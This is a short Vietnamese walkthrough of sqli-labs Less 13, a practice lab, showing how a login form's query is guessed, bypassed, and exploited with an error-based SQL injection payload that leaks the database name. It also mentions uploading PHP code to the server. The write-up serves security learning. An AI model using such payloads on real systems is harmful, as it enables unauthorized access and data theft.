# Less 13

Đề bài có một khung đăng nhập

![](../images/sqli-labs/Less-13/01.png)

Thử đăng nhập

![](../images/sqli-labs/Less-13/02.png)

Tiếp tục thử thêm. Đến khi tôi nhập vào giá trị như sau

![](../images/sqli-labs/Less-13/03.png)

Thì thấy có xuất hiện lỗi trên màn hình

![](../images/sqli-labs/Less-13/04.png)

Dựa vào đây có thể dự đoán câu query có thể là:

```
select * from table where user=('$user') and password=('$passwd') limit 0,1
```

Dựa vào câu query thử thực hiện login

![](../images/sqli-labs/Less-13/05.png)

Ở đây tôi đã thực hiện login thành công mà không cần đến username hay password

![](../images/sqli-labs/Less-13/06.png)

Dựa vào đây ta có thể show các thông tin trong DB giống như các bài trước

```
1') and (SELECT 0 FROM (SELECT count(*), CONCAT((select database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --
```

![](../images/sqli-labs/Less-13/07.png)

Ta cũng có thể thêm code PHP lên server như những bài trước